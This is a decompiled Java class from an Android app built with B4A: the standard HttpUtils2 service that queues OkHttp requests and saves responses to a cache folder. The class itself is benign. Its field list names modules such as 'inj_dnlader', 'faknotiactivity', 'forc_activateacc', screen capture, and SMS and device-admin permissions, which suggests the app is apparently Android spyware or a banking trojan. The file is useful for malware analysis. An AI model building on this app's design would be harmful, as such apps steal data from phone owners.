package com.com.androidrr;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.ReceiverHelper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4h.okhttp.OkHttpClientWrapper;
import b4a.example.dateutils;

/* loaded from: classes.dex */
public class httputils2service extends BroadcastReceiver {
    public static OkHttpClientWrapper _hc = null;
    public static int _taskcounter = 0;
    public static Map _taskidtojob = null;
    public static String _tempfolder = "";
    private static boolean firstTime = true;
    static httputils2service mostCurrent;
    public static BA processBA;
    private ReceiverHelper _receiver;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;

    public static String _service_destroy() throws Exception {
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        return "";
    }

    public static Class<?> getObject() {
        return httputils2service.class;
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(context, (BALayout) null, (BA) null, BA.SharedProcessBA.ModuleType.RECEIVER, "com.com.androidrr.httputils2service");
            processBA = BA;
            if (BA.isShellModeRuntimeCheck(BA)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._receiver = new ReceiverHelper(this);
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA BA2 = processBA;
            BA2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.httputils2service", BA2, this._receiver, Float.valueOf(Common.Density));
        }
        processBA.setActivityPaused(false);
        StringBuilder sb = new StringBuilder();
        sb.append("*** Receiver (httputils2service) Receive ");
        sb.append(firstTime ? "(first time)" : "");
        sb.append(" ***");
        BA.LogInfo(sb.toString());
        IntentWrapper intentWrapper = new IntentWrapper();
        intentWrapper.setObject(intent);
        processBA.raiseEvent(null, "receiver_receive", Boolean.valueOf(firstTime), intentWrapper);
        firstTime = false;
    }

    public static String _completejob(int i, boolean z, String str) throws Exception {
        httpjob httpjobVar = (httpjob) _taskidtojob.Get(Integer.valueOf(i));
        if (httpjobVar == null) {
            Common.LogImpl("631457286", "HttpUtils2Service: job completed multiple times - " + BA.NumberToString(i), 0);
            return "";
        }
        _taskidtojob.Remove(Integer.valueOf(i));
        httpjobVar._success = z;
        httpjobVar._errormessage = str;
        httpjobVar._complete(i);
        return "";
    }

    public static String _hc_responseerror(OkHttpClientWrapper.OkHttpResponse okHttpResponse, String str, int i, int i2) throws Exception {
        Common.LogImpl("631391746", "ResponseError. Reason: " + Common.SmartStringFormatter("", str) + ", Response: " + Common.SmartStringFormatter("", okHttpResponse.getErrorResponse()) + "", 0);
        okHttpResponse.Release();
        httpjob httpjobVar = (httpjob) _taskidtojob.Get(Integer.valueOf(i2));
        if (httpjobVar == null) {
            Common.LogImpl("631391751", "HttpUtils2Service (hc_ResponseError): job completed multiple times - " + BA.NumberToString(i2), 0);
            return "";
        }
        httpjobVar._response = okHttpResponse;
        if (!okHttpResponse.getErrorResponse().equals("")) {
            _completejob(i2, false, okHttpResponse.getErrorResponse());
        } else {
            _completejob(i2, false, str);
        }
        return "";
    }

    public static String _hc_responsesuccess(OkHttpClientWrapper.OkHttpResponse okHttpResponse, int i) throws Exception {
        httpjob httpjobVar = (httpjob) _taskidtojob.Get(Integer.valueOf(i));
        if (httpjobVar == null) {
            Common.LogImpl("631260675", "HttpUtils2Service (hc_ResponseSuccess): job completed multiple times - " + BA.NumberToString(i), 0);
            return "";
        }
        httpjobVar._response = okHttpResponse;
        new File.OutputStreamWrapper();
        File file = Common.File;
        okHttpResponse.GetAsynchronously(processBA, "response", File.OpenOutput(_tempfolder, BA.NumberToString(i), false).getObject(), true, i);
        return "";
    }

    public static String _process_globals() throws Exception {
        _hc = new OkHttpClientWrapper();
        _taskidtojob = new Map();
        _tempfolder = "";
        _taskcounter = 0;
        return "";
    }

    public static String _receiver_receive(boolean z, IntentWrapper intentWrapper) throws Exception {
        if (!z) {
            return "";
        }
        _service_create();
        return "";
    }

    public static String _response_streamfinish(boolean z, int i) throws Exception {
        if (z) {
            _completejob(i, z, "");
        } else {
            _completejob(i, z, Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static String _service_create() throws Exception {
        File file = Common.File;
        _tempfolder = File.getDirInternalCache();
        try {
            File file2 = Common.File;
            File.WriteString(_tempfolder, "~test.test", "test");
            File file3 = Common.File;
            File.Delete(_tempfolder, "~test.test");
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("630932999", BA.ObjectToString(Common.LastException(processBA)), 0);
            Common.LogImpl("630933000", "Switching to File.DirInternal", 0);
            File file4 = Common.File;
            _tempfolder = File.getDirInternal();
        }
        if (!_hc.IsInitialized()) {
            _hc.Initialize("hc");
        }
        _taskidtojob.Initialize();
        return "";
    }

    public static String _submitjob(httpjob httpjobVar) throws Exception {
        if (!_taskidtojob.IsInitialized()) {
            _service_create();
        }
        int i = _taskcounter + 1;
        _taskcounter = i;
        _taskidtojob.Put(Integer.valueOf(i), httpjobVar);
        if (!httpjobVar._username.equals("") && !httpjobVar._password.equals("")) {
            _hc.ExecuteCredentials(processBA, httpjobVar._getrequest(), i, httpjobVar._username, httpjobVar._password);
        } else {
            _hc.Execute(processBA, httpjobVar._getrequest(), i);
        }
        return "";
    }
}
